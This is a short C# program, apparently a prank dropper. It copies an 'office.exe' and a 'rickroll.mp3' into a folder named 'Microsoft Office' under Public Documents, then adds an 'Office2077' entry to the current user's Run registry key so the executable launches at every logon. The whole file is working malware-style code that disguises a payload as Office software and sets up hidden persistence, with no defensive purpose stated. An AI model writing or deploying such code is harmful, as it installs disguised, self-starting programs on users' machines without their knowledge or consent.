using System;
using System.Diagnostics;
using System.Runtime;
using System.IO;
using Microsoft.Win32;
namespace Startprogram
{
	class Pogram
	{
		static void Main(string[] args)
		{
			if (Directory.Exists(@"C:\Users\Public\Documents\Microsoft Office") == true)
			{
				string path = @"office.exe";
				string path1 = @"C:\Users\Public\Documents\Microsoft Office\office.exe";
				string path2 = @"rickroll.mp3";
				string path3 = @"C:\Users\Public\Documents\Microsoft Office\rickroll.mp3";
				File.Copy(path, path1);
				File.Copy(path2, path3);
			} 
			else
			{
				Directory.CreateDirectory(@"C:\Users\Public\Documents\Microsoft Office");
				string path = @"office.exe";
				string path1 = @"C:\Users\Public\Documents\Microsoft Office\office.exe";
				string path2 = @"rickroll.mp3";
				string path3 = @"C:\Users\Public\Documents\Microsoft Office\rickroll.mp3";
				File.Copy(path, path1);
				File.Copy(path2, path3);
			}
				RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
				key.SetValue("Office2077", @"C:\Users\Public\Documents\Microsoft Office\office.exe");
		}
	}
}
